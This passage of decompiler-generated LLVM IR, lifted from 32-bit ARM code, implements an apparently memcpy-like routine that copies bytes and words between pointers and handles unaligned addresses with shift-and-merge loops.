  store i32 %v5_14c5c, i32* %r1.global-to-local, align 4
  %v2_14c60 = load i32, i32* @r0, align 4
  %v3_14c60 = inttoptr i32 %v2_14c60 to i8*
  store i8 %v2_14c5c, i8* %v3_14c60, align 1
  %v4_14c60 = load i32, i32* @r0, align 4
  %v5_14c60 = add i32 %v4_14c60, 1
  store i32 %v5_14c60, i32* %r0.global-to-local, align 4
  %v0_14c64 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14c64 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14c64 = xor i1 %v0_14c64, %v1_14c64
  br i1 %v2_14c64, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_14c64 = load i32, i32* %r1.global-to-local, align 4
  %v4_14c64 = inttoptr i32 %v3_14c64 to i8*
  %v5_14c64 = load i8, i8* %v4_14c64, align 1
  %v8_14c64 = add i32 %v3_14c64, 1
  store i32 %v8_14c64, i32* %r1.global-to-local, align 4
  %v6_14c68 = inttoptr i32 %v5_14c60 to i8*
  store i8 %v5_14c64, i8* %v6_14c68, align 1
  %v7_14c68 = load i32, i32* %r0.global-to-local, align 4
  %v8_14c68 = add i32 %v7_14c68, 1
  store i32 %v8_14c68, i32* %r0.global-to-local, align 4
  %v1_14c6c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14c6c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_14c70 = phi i32 [ %v8_14c68, %bb143 ], [ %v5_14c60, %bb142 ]
  %v2_14c70 = phi i1 [ %v2_14c6c.pre, %bb143 ], [ %v1_14c64, %bb142 ]
  %v1_14c70 = phi i1 [ %v1_14c6c.pre, %bb143 ], [ %v0_14c64, %bb142 ]
  %v0_14c6c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14c6c = xor i1 %v2_14c70, %v1_14c70
  %v4_14c6c = or i1 %v0_14c6c, %v3_14c6c
  br i1 %v4_14c6c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_14c6c = load i32, i32* %r1.global-to-local, align 4
  %v6_14c6c = inttoptr i32 %v5_14c6c to i8*
  %v7_14c6c = load i8, i8* %v6_14c6c, align 1
  %v10_14c6c = add i32 %v5_14c6c, 1
  store i32 %v10_14c6c, i32* %r1.global-to-local, align 4
  %v8_14c70 = inttoptr i32 %v7_14c70 to i8*
  store i8 %v7_14c6c, i8* %v8_14c70, align 1
  %v9_14c70 = load i32, i32* %r0.global-to-local, align 4
  %v10_14c70 = add i32 %v9_14c70, 1
  store i32 %v10_14c70, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_14c74 = load i8*, i8** %stack_var_-8, align 4
  %v3_14c74 = ptrtoint i8* %v2_14c74 to i32
  store i32 %v3_14c74, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_14bbc)
  %v0_14c7c.pre = load i32, i32* @ip, align 4
  %v0_14c84.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_14c88.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14bc8, %.thread126
  %v2_14c88 = phi i32 [ %v1_14bb0, %dec_label_pc_14bc8 ], [ %v2_14c88.pre, %.thread126 ]
  %v0_14c84 = phi i32 [ %v0_14bb0, %dec_label_pc_14bc8 ], [ %v0_14c84.pre, %.thread126 ]
  %v0_14c7c = phi i32 [ %v1_14bc8, %dec_label_pc_14bc8 ], [ %v0_14c7c.pre, %.thread126 ]
  %v1_14c7c = sub i32 4, %v0_14c7c
  store i32 %v1_14c7c, i32* @ip, align 4
  %v1_14c80 = add i32 %v1_14c7c, -2
  %v3_14c80 = sub i32 1, %v1_14c7c
  %v4_14c80 = and i32 %v3_14c80, %v1_14c7c
  %v5_14c80 = icmp slt i32 %v4_14c80, 0
  store i1 %v5_14c80, i1* %cpsr_v.global-to-local, align 1
  %v6_14c80 = icmp slt i32 %v1_14c80, 0
  store i1 %v6_14c80, i1* %cpsr_n.global-to-local, align 1
  %v7_14c80 = icmp eq i32 %v1_14c7c, 2
  store i1 %v7_14c80, i1* %cpsr_z.global-to-local, align 1
  %v1_14c84 = inttoptr i32 %v0_14c84 to i8*
  %v2_14c84 = load i8, i8* %v1_14c84, align 1
  %v3_14c84 = zext i8 %v2_14c84 to i32
  store i32 %v3_14c84, i32* @r3, align 4
  %v5_14c84 = add i32 %v0_14c84, 1
  store i32 %v5_14c84, i32* @r1, align 4
  %v3_14c88 = inttoptr i32 %v2_14c88 to i8*
  store i8 %v2_14c84, i8* %v3_14c88, align 1
  %v4_14c88 = load i32, i32* @r0, align 4
  %v5_14c88 = add i32 %v4_14c88, 1
  store i32 %v5_14c88, i32* @r0, align 4
  %v0_14c8c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14c8c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14c8c = xor i1 %v0_14c8c, %v1_14c8c
  br i1 %v2_14c8c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_14c7c
  %v3_14c8c = load i32, i32* @r1, align 4
  %v4_14c8c = inttoptr i32 %v3_14c8c to i8*
  %v5_14c8c = load i8, i8* %v4_14c8c, align 1
  %v6_14c8c = zext i8 %v5_14c8c to i32
  store i32 %v6_14c8c, i32* @r3, align 4
  %v8_14c8c = add i32 %v3_14c8c, 1
  store i32 %v8_14c8c, i32* @r1, align 4
  %v6_14c90 = inttoptr i32 %v5_14c88 to i8*
  store i8 %v5_14c8c, i8* %v6_14c90, align 1
  %v7_14c90 = load i32, i32* @r0, align 4
  %v8_14c90 = add i32 %v7_14c90, 1
  store i32 %v8_14c90, i32* @r0, align 4
  %v1_14c94.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14c94.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_14c7c, %bb145
  %v7_14c98 = phi i32 [ %v8_14c90, %bb145 ], [ %v5_14c88, %dec_label_pc_14c7c ]
  %v2_14c98 = phi i1 [ %v2_14c94.pre, %bb145 ], [ %v1_14c8c, %dec_label_pc_14c7c ]
  %v1_14c98 = phi i1 [ %v1_14c94.pre, %bb145 ], [ %v0_14c8c, %dec_label_pc_14c7c ]
  %v0_14c94 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14c94 = xor i1 %v2_14c98, %v1_14c98
  %v4_14c94 = or i1 %v0_14c94, %v3_14c94
  br i1 %v4_14c94, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_14c94 = load i32, i32* @r1, align 4
  %v6_14c94 = inttoptr i32 %v5_14c94 to i8*
  %v7_14c94 = load i8, i8* %v6_14c94, align 1
  %v8_14c94 = zext i8 %v7_14c94 to i32
  store i32 %v8_14c94, i32* @r3, align 4
  %v10_14c94 = add i32 %v5_14c94, 1
  store i32 %v10_14c94, i32* @r1, align 4
  %v8_14c98 = inttoptr i32 %v7_14c98 to i8*
  store i8 %v7_14c94, i8* %v8_14c98, align 1
  %v9_14c98 = load i32, i32* @r0, align 4
  %v10_14c98 = add i32 %v9_14c98, 1
  store i32 %v10_14c98, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_14dcc77 = phi i32 [ %v10_14c98, %bb146 ], [ %v7_14c98, %.thread127 ]
  %v0_14c9c = load i32, i32* %r2.global-to-local, align 4
  %v1_14c9c = load i32, i32* @ip, align 4
  %v2_14c9c = sub i32 %v0_14c9c, %v1_14c9c
  store i32 %v2_14c9c, i32* %r2.global-to-local, align 4
  %v4_14c9c = xor i32 %v1_14c9c, %v0_14c9c
  %v5_14c9c = xor i32 %v2_14c9c, %v0_14c9c
  %v6_14c9c = and i32 %v5_14c9c, %v4_14c9c
  %v7_14c9c = icmp slt i32 %v6_14c9c, 0
  store i1 %v7_14c9c, i1* %cpsr_v.global-to-local, align 1
  %v8_14c9c = icmp slt i32 %v2_14c9c, 0
  store i1 %v8_14c9c, i1* %cpsr_n.global-to-local, align 1
  %v9_14c9c = icmp eq i32 %v0_14c9c, %v1_14c9c
  store i1 %v9_14c9c, i1* %cpsr_z.global-to-local, align 1
  %v2_14ca0 = xor i1 %v8_14c9c, %v7_14c9c
  br i1 %v2_14ca0, label %bb140, label %dec_label_pc_14ca4

dec_label_pc_14ca4:                               ; preds = %.thread128
  %v0_14ca4 = load i32, i32* @r1, align 4
  %v1_14ca4 = urem i32 %v0_14ca4, 4
  store i32 %v1_14ca4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14ca4 = icmp eq i32 %v1_14ca4, 0
  store i1 %v2_14ca4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_14ca4 to i2
  br i1 %v2_14ca4, label %dec_label_pc_14bd8, label %dec_label_pc_14cac

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14ca4
  %v0_14dcc76 = phi i32 [ %v1_14bb0, %dec_label_pc_14bd0 ], [ %v0_14dcc77, %dec_label_pc_14ca4 ]
  %v0_14d34 = phi i32 [ %v2_14bc0, %dec_label_pc_14bd0 ], [ %v2_14c9c, %dec_label_pc_14ca4 ]
  %v0_14cb4.off0 = phi i2 [ %extract.t, %dec_label_pc_14bd0 ], [ %extract.t131, %dec_label_pc_14ca4 ]
  %v0_14cac = phi i32 [ %v0_14bb0, %dec_label_pc_14bd0 ], [ %v0_14ca4, %dec_label_pc_14ca4 ]
  %v1_14cac = and i32 %v0_14cac, -4
  store i32 %v1_14cac, i32* %r1.global-to-local, align 4
  %v1_14cb0 = inttoptr i32 %v1_14cac to i32*
  %v2_14cb0 = load i32, i32* %v1_14cb0, align 4
  store i32 %v2_14cb0, i32* %lr.global-to-local, align 4
  %v4_14cb0 = add i32 %v1_14cac, 4
  store i32 %v4_14cb0, i32* %r1.global-to-local, align 4
  %v1_14d2c = add i32 %v0_14d34, -12
  %v3_14d2c = sub i32 11, %v0_14d34
  %v4_14d2c = and i32 %v3_14d2c, %v0_14d34
  %v5_14d2c = icmp slt i32 %v4_14d2c, 0
  store i1 %v5_14d2c, i1* %cpsr_v.global-to-local, align 1
  %v6_14d2c = icmp slt i32 %v1_14d2c, 0
  store i1 %v6_14d2c, i1* %cpsr_n.global-to-local, align 1
  %v7_14d2c = icmp eq i32 %v0_14d34, 12
  store i1 %v7_14d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_14d30 = xor i1 %v6_14d2c, %v5_14d2c
  switch i2 %v0_14cb4.off0, label %dec_label_pc_14cc0 [
    i2 -1, label %dec_label_pc_14d98
    i2 -2, label %dec_label_pc_14d2c
  ]

dec_label_pc_14cc0:                               ; preds = %dec_label_pc_14cac
  br i1 %v2_14d30, label %dec_label_pc_14d0c, label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cc0
  store i32 %v1_14d2c, i32* %r2.global-to-local, align 4
  %v3_14ccc = load i32, i32* @r4, align 4
  store i32 %v3_14ccc, i32* %stack_var_-16, align 4
  %v6_14ccc = load i32, i32* @r5, align 4
  store i32 %v6_14ccc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14cd0

dec_label_pc_14cd0:                               ; preds = %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge, %dec_label_pc_14cc8
  %v0_14cf4 = phi i32 [ %v12_14cf4, %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge ], [ %v0_14dcc76, %dec_label_pc_14cc8 ]
  %v0_14cd4 = phi i32 [ %v0_14cd4.pre, %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge ], [ %v4_14cb0, %dec_label_pc_14cc8 ]
  %v0_14cd0 = phi i32 [ %v0_14cd0.pre, %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge ], [ %v2_14cb0, %dec_label_pc_14cc8 ]
  %v3_14cd0 = udiv i32 %v0_14cd0, 256
  %v1_14cd4 = inttoptr i32 %v0_14cd4 to i32*
  %v2_14cd4 = load i32, i32* %v1_14cd4, align 4
  store i32 %v2_14cd4, i32* %r4.global-to-local, align 4
  %v3_14cd4 = add i32 %v0_14cd4, 4
  %v4_14cd4 = inttoptr i32 %v3_14cd4 to i32*
  %v5_14cd4 = load i32, i32* %v4_14cd4, align 4
  store i32 %v5_14cd4, i32* %r5.global-to-local, align 4
  %v6_14cd4 = add i32 %v0_14cd4, 8
  %v7_14cd4 = inttoptr i32 %v6_14cd4 to i32*
  %v8_14cd4 = load i32, i32* %v7_14cd4, align 4
  store i32 %v8_14cd4, i32* %ip.global-to-local, align 4
  %v9_14cd4 = add i32 %v0_14cd4, 12
  %v10_14cd4 = inttoptr i32 %v9_14cd4 to i32*
  %v11_14cd4 = load i32, i32* %v10_14cd4, align 4
  store i32 %v11_14cd4, i32* %lr.global-to-local, align 4
  %v12_14cd4 = add i32 %v0_14cd4, 16
  store i32 %v12_14cd4, i32* %r1.global-to-local, align 4
  %v4_14cd8 = mul i32 %v2_14cd4, 16777216
  %v5_14cd8 = or i32 %v4_14cd8, %v3_14cd0
  store i32 %v5_14cd8, i32* @r3, align 4
  %v3_14cdc = udiv i32 %v2_14cd4, 256
  %v4_14ce0 = mul i32 %v5_14cd4, 16777216
  %v5_14ce0 = or i32 %v4_14ce0, %v3_14cdc
  store i32 %v5_14ce0, i32* %r4.global-to-local, align 4
  %v3_14ce4 = udiv i32 %v5_14cd4, 256
  %v4_14ce8 = mul i32 %v8_14cd4, 16777216
  %v5_14ce8 = or i32 %v4_14ce8, %v3_14ce4
  store i32 %v5_14ce8, i32* %r5.global-to-local, align 4
  %v3_14cec = udiv i32 %v8_14cd4, 256
  %v4_14cf0 = mul i32 %v11_14cd4, 16777216
  %v5_14cf0 = or i32 %v4_14cf0, %v3_14cec
  store i32 %v5_14cf0, i32* @ip, align 4
  %v1_14cf4 = inttoptr i32 %v0_14cf4 to i32*
  store i32 %v5_14cd8, i32* %v1_14cf4, align 4
  %v3_14cf4 = add i32 %v0_14cf4, 4
  %v4_14cf4 = inttoptr i32 %v3_14cf4 to i32*
  %v5_14cf4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14cf4, i32* %v4_14cf4, align 4
  %v6_14cf4 = add i32 %v0_14cf4, 8
  %v7_14cf4 = inttoptr i32 %v6_14cf4 to i32*
  %v8_14cf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14cf4, i32* %v7_14cf4, align 4
  %v9_14cf4 = add i32 %v0_14cf4, 12
  %v10_14cf4 = inttoptr i32 %v9_14cf4 to i32*
  %v11_14cf4 = load i32, i32* @ip, align 4
  store i32 %v11_14cf4, i32* %v10_14cf4, align 4
  %v12_14cf4 = add i32 %v0_14cf4, 16
  store i32 %v12_14cf4, i32* @r0, align 4
  %v0_14cf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14cf8 = add i32 %v0_14cf8, -16
  store i32 %v1_14cf8, i32* %r2.global-to-local, align 4
  %v3_14cf8 = sub i32 15, %v0_14cf8
  %v4_14cf8 = and i32 %v3_14cf8, %v0_14cf8
  %v5_14cf8 = icmp slt i32 %v4_14cf8, 0
  %v6_14cf8 = icmp slt i32 %v1_14cf8, 0
  %v2_14cfc = xor i1 %v6_14cf8, %v5_14cf8
  br i1 %v2_14cfc, label %dec_label_pc_14d00, label %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge

dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge:  ; preds = %dec_label_pc_14cd0
  %v0_14cd0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14cd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cd0

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14cd0
  %v2_14d00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d00, i32* @r4, align 4
  %v5_14d00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14d00, i32* @r5, align 4
  %v1_14d04 = add i32 %v0_14cf8, -4
  store i32 %v1_14d04, i32* %r2.global-to-local, align 4
  %v3_14d04 = add i32 %v0_14cf8, 2147483632
  %v4_14d04 = and i32 %v1_14d04, %v3_14d04
  %v5_14d04 = icmp slt i32 %v4_14d04, 0
  store i1 %v5_14d04, i1* %cpsr_v.global-to-local, align 1
  %v6_14d04 = icmp slt i32 %v1_14d04, 0
  store i1 %v6_14d04, i1* %cpsr_n.global-to-local, align 1
  %v7_14d04 = icmp eq i32 %v1_14d04, 0
  store i1 %v7_14d04, i1* %cpsr_z.global-to-local, align 1
  %v2_14d08 = xor i1 %v6_14d04, %v5_14d04
  br i1 %v2_14d08, label %dec_label_pc_14d24, label %dec_label_pc_14d0c

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14d00, %dec_label_pc_14cc0, %dec_label_pc_14d0c
  %v1_14d18 = phi i32 [ %v4_14d18, %dec_label_pc_14d0c ], [ %v12_14cf4, %dec_label_pc_14d00 ], [ %v0_14dcc76, %dec_label_pc_14cc0 ]
  %v0_14d0c = load i32, i32* %lr.global-to-local, align 4
  %v3_14d0c = udiv i32 %v0_14d0c, 256
  store i32 %v3_14d0c, i32* %ip.global-to-local, align 4
  %v0_14d10 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d10 = inttoptr i32 %v0_14d10 to i32*
  %v2_14d10 = load i32, i32* %v1_14d10, align 4
  store i32 %v2_14d10, i32* %lr.global-to-local, align 4
  %v4_14d10 = add i32 %v0_14d10, 4
  store i32 %v4_14d10, i32* %r1.global-to-local, align 4
  %v4_14d14 = mul i32 %v2_14d10, 16777216
  %v5_14d14 = or i32 %v4_14d14, %v3_14d0c
  store i32 %v5_14d14, i32* @ip, align 4
  %v2_14d18 = inttoptr i32 %v1_14d18 to i32*
  store i32 %v5_14d14, i32* %v2_14d18, align 4
  %v3_14d18 = load i32, i32* @r0, align 4
  %v4_14d18 = add i32 %v3_14d18, 4
  store i32 %v4_14d18, i32* @r0, align 4
  %v0_14d1c = load i32, i32* %r2.global-to-local, align 4
  %v1_14d1c = add i32 %v0_14d1c, -4
  store i32 %v1_14d1c, i32* %r2.global-to-local, align 4
  %v3_14d1c = sub i32 3, %v0_14d1c
  %v4_14d1c = and i32 %v3_14d1c, %v0_14d1c
  %v5_14d1c = icmp slt i32 %v4_14d1c, 0
  %v6_14d1c = icmp slt i32 %v1_14d1c, 0
  %v2_14d20 = xor i1 %v6_14d1c, %v5_14d1c
  br i1 %v2_14d20, label %dec_label_pc_14d24.loopexit, label %dec_label_pc_14d0c

dec_label_pc_14d24.loopexit:                      ; preds = %dec_label_pc_14d0c
  %v7_14d1c = icmp eq i32 %v0_14d1c, 4
  store i1 %v5_14d1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_14d1c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_14d1c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14d24

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14d24.loopexit, %dec_label_pc_14d00
  %v0_14c4c59 = phi i32 [ %v1_14d1c, %dec_label_pc_14d24.loopexit ], [ %v1_14d04, %dec_label_pc_14d00 ]
  %v0_14d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d24 = add i32 %v0_14d24, -3
  store i32 %v1_14d24, i32* @r1, align 4
  br label %bb140

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14cac
  br i1 %v2_14d30, label %dec_label_pc_14d78, label %dec_label_pc_14d34

dec_label_pc_14d34:                               ; preds = %dec_label_pc_14d2c
  store i32 %v1_14d2c, i32* %r2.global-to-local, align 4
  %v3_14d38 = load i32, i32* @r4, align 4
  store i32 %v3_14d38, i32* %stack_var_-16, align 4
  %v6_14d38 = load i32, i32* @r5, align 4
  store i32 %v6_14d38, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14d3c

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14d3c.dec_label_pc_14d3c_crit_edge, %dec_label_pc_14d34
  %v0_14d60 = phi i32 [ %v12_14d60, %dec_label_pc_14d3c.dec_label_pc_14d3c_crit_edge ], [ %v0_14dcc76, %dec_label_pc_14d34 ]
  %v0_14d40 = phi i32 [ %v0_14d40.pre, %dec_label_pc_14d3c.dec_label_pc_14d3c_crit_edge ], [ %v4_14cb0, %dec_label_pc_14d34 ]
  %v0_14d3c = phi i32 [ %v0_14d3c.pre, %dec_label_pc_14d3c.dec_label_pc_14d3c_crit_edge ], [ %v2_14cb0, %dec_label_pc_14d34 ]
  %v3_14d3c = udiv i32 %v0_14d3c, 65536
  %v1_14d40 = inttoptr i32 %v0_14d40 to i32*
  %v2_14d40 = load i32, i32* %v1_14d40, align 4
  store i32 %v2_14d40, i32* %r4.global-to-local, align 4
  %v3_14d40 = add i32 %v0_14d40, 4
  %v4_14d40 = inttoptr i32 %v3_14d40 to i32*
  %v5_14d40 = load i32, i32* %v4_14d40, align 4
  store i32 %v5_14d40, i32* %r5.global-to-local, align 4
  %v6_14d40 = add i32 %v0_14d40, 8
  %v7_14d40 = inttoptr i32 %v6_14d40 to i32*
  %v8_14d40 = load i32, i32* %v7_14d40, align 4
  store i32 %v8_14d40, i32* %ip.global-to-local, align 4
  %v9_14d40 = add i32 %v0_14d40, 12
  %v10_14d40 = inttoptr i32 %v9_14d40 to i32*
  %v11_14d40 = load i32, i32* %v10_14d40, align 4
  store i32 %v11_14d40, i32* %lr.global-to-local, align 4
  %v12_14d40 = add i32 %v0_14d40, 16
  store i32 %v12_14d40, i32* %r1.global-to-local, align 4
  %v4_14d44 = mul i32 %v2_14d40, 65536
  %v5_14d44 = or i32 %v4_14d44, %v3_14d3c
  store i32 %v5_14d44, i32* @r3, align 4
  %v3_14d48 = udiv i32 %v2_14d40, 65536
  %v4_14d4c = mul i32 %v5_14d40, 65536
  %v5_14d4c = or i32 %v4_14d4c, %v3_14d48
  store i32 %v5_14d4c, i32* %r4.global-to-local, align 4
  %v3_14d50 = udiv i32 %v5_14d40, 65536
  %v4_14d54 = mul i32 %v8_14d40, 65536
  %v5_14d54 = or i32 %v4_14d54, %v3_14d50
  store i32 %v5_14d54, i32* %r5.global-to-local, align 4
  %v3_14d58 = udiv i32 %v8_14d40, 65536
  %v4_14d5c = mul i32 %v11_14d40, 65536
  %v5_14d5c = or i32 %v4_14d5c, %v3_14d58
  store i32 %v5_14d5c, i32* @ip, align 4
  %v1_14d60 = inttoptr i32 %v0_14d60 to i32*
  store i32 %v5_14d44, i32* %v1_14d60, align 4
  %v3_14d60 = add i32 %v0_14d60, 4
  %v4_14d60 = inttoptr i32 %v3_14d60 to i32*
  %v5_14d60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14d60, i32* %v4_14d60, align 4
  %v6_14d60 = add i32 %v0_14d60, 8
  %v7_14d60 = inttoptr i32 %v6_14d60 to i32*
  %v8_14d60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14d60, i32* %v7_14d60, align 4
  %v9_14d60 = add i32 %v0_14d60, 12
  %v10_14d60 = inttoptr i32 %v9_14d60 to i32*
  %v11_14d60 = load i32, i32* @ip, align 4
  store i32 %v11_14d60, i32* %v10_14d60, align 4
  %v12_14d60 = add i32 %v0_14d60, 16
  store i32 %v12_14d60, i32* @r0, align 4
  %v0_14d64 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d64 = add i32 %v0_14d64, -16
  store i32 %v1_14d64, i32* %r2.global-to-local, align 4
  %v3_14d64 = sub i32 15, %v0_14d64
  %v4_14d64 = and i32 %v3_14d64, %v0_14d64
  %v5_14d64 = icmp slt i32 %v4_14d64, 0
  %v6_14d64 = icmp slt i32 %v1_14d64, 0
  %v2_14d68 = xor i1 %v6_14d64, %v5_14d64
  br i1 %v2_14d68, label %dec_label_pc_14d6c, label %dec_label_pc_14d3c.dec_label_pc_14d3c_crit_edge

dec_label_pc_14d3c.dec_label_pc_14d3c_crit_edge:  ; preds = %dec_label_pc_14d3c
  %v0_14d3c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14d40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d3c

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14d3c
  %v2_14d6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d6c, i32* @r4, align 4
  %v5_14d6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14d6c, i32* @r5, align 4
  %v1_14d70 = add i32 %v0_14d64, -4
  store i32 %v1_14d70, i32* %r2.global-to-local, align 4
  %v3_14d70 = add i32 %v0_14d64, 2147483632
  %v4_14d70 = and i32 %v1_14d70, %v3_14d70
  %v5_14d70 = icmp slt i32 %v4_14d70, 0
  store i1 %v5_14d70, i1* %cpsr_v.global-to-local, align 1
  %v6_14d70 = icmp slt i32 %v1_14d70, 0
  store i1 %v6_14d70, i1* %cpsr_n.global-to-local, align 1
  %v7_14d70 = icmp eq i32 %v1_14d70, 0
  store i1 %v7_14d70, i1* %cpsr_z.global-to-local, align 1
  %v2_14d74 = xor i1 %v6_14d70, %v5_14d70
  br i1 %v2_14d74, label %dec_label_pc_14d90, label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d6c, %dec_label_pc_14d2c, %dec_label_pc_14d78
  %v1_14d84 = phi i32 [ %v4_14d84, %dec_label_pc_14d78 ], [ %v12_14d60, %dec_label_pc_14d6c ], [ %v0_14dcc76, %dec_label_pc_14d2c ]
  %v0_14d78 = load i32, i32* %lr.global-to-local, align 4
  %v3_14d78 = udiv i32 %v0_14d78, 65536
  store i32 %v3_14d78, i32* %ip.global-to-local, align 4
  %v0_14d7c = load i32, i32* %r1.global-to-local, align 4
  %v1_14d7c = inttoptr i32 %v0_14d7c to i32*
  %v2_14d7c = load i32, i32* %v1_14d7c, align 4
  store i32 %v2_14d7c, i32* %lr.global-to-local, align 4
  %v4_14d7c = add i32 %v0_14d7c, 4
  store i32 %v4_14d7c, i32* %r1.global-to-local, align 4
  %v4_14d80 = mul i32 %v2_14d7c, 65536
  %v5_14d80 = or i32 %v4_14d80, %v3_14d78
  store i32 %v5_14d80, i32* @ip, align 4
  %v2_14d84 = inttoptr i32 %v1_14d84 to i32*
  store i32 %v5_14d80, i32* %v2_14d84, align 4
  %v3_14d84 = load i32, i32* @r0, align 4
  %v4_14d84 = add i32 %v3_14d84, 4
  store i32 %v4_14d84, i32* @r0, align 4
  %v0_14d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d88 = add i32 %v0_14d88, -4
  store i32 %v1_14d88, i32* %r2.global-to-local, align 4
  %v3_14d88 = sub i32 3, %v0_14d88
  %v4_14d88 = and i32 %v3_14d88, %v0_14d88
  %v5_14d88 = icmp slt i32 %v4_14d88, 0
  %v6_14d88 = icmp slt i32 %v1_14d88, 0
  %v2_14d8c = xor i1 %v6_14d88, %v5_14d88
  br i1 %v2_14d8c, label %dec_label_pc_14d90.loopexit, label %dec_label_pc_14d78

dec_label_pc_14d90.loopexit:                      ; preds = %dec_label_pc_14d78
  %v7_14d88 = icmp eq i32 %v0_14d88, 4
  store i1 %v5_14d88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_14d88, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_14d88, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14d90

dec_label_pc_14d90:                               ; preds = %dec_label_pc_14d90.loopexit, %dec_label_pc_14d6c
  %v0_14c4c60 = phi i32 [ %v1_14d88, %dec_label_pc_14d90.loopexit ], [ %v1_14d70, %dec_label_pc_14d6c ]
  %v0_14d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d90 = add i32 %v0_14d90, -2
  store i32 %v1_14d90, i32* @r1, align 4
  br label %bb140

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14cac
  br i1 %v2_14d30, label %dec_label_pc_14de4, label %dec_label_pc_14da0

dec_label_pc_14da0:                               ; preds = %dec_label_pc_14d98
  store i32 %v1_14d2c, i32* %r2.global-to-local, align 4
  %v3_14da4 = load i32, i32* @r4, align 4
  store i32 %v3_14da4, i32* %stack_var_-16, align 4
  %v6_14da4 = load i32, i32* @r5, align 4
  store i32 %v6_14da4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14da8.dec_label_pc_14da8_crit_edge, %dec_label_pc_14da0
  %v0_14dcc = phi i32 [ %v12_14dcc, %dec_label_pc_14da8.dec_label_pc_14da8_crit_edge ], [ %v0_14dcc76, %dec_label_pc_14da0 ]
  %v0_14dac = phi i32 [ %v0_14dac.pre, %dec_label_pc_14da8.dec_label_pc_14da8_crit_edge ], [ %v4_14cb0, %dec_label_pc_14da0 ]
  %v0_14da8 = phi i32 [ %v0_14da8.pre, %dec_label_pc_14da8.dec_label_pc_14da8_crit_edge ], [ %v2_14cb0, %dec_label_pc_14da0 ]
  %v3_14da8 = udiv i32 %v0_14da8, 16777216
  %v1_14dac = inttoptr i32 %v0_14dac to i32*
  %v2_14dac = load i32, i32* %v1_14dac, align 4
  store i32 %v2_14dac, i32* %r4.global-to-local, align 4
  %v3_14dac = add i32 %v0_14dac, 4
  %v4_14dac = inttoptr i32 %v3_14dac to i32*
  %v5_14dac = load i32, i32* %v4_14dac, align 4
  store i32 %v5_14dac, i32* %r5.global-to-local, align 4
  %v6_14dac = add i32 %v0_14dac, 8
  %v7_14dac = inttoptr i32 %v6_14dac to i32*
  %v8_14dac = load i32, i32* %v7_14dac, align 4
  store i32 %v8_14dac, i32* %ip.global-to-local, align 4
  %v9_14dac = add i32 %v0_14dac, 12
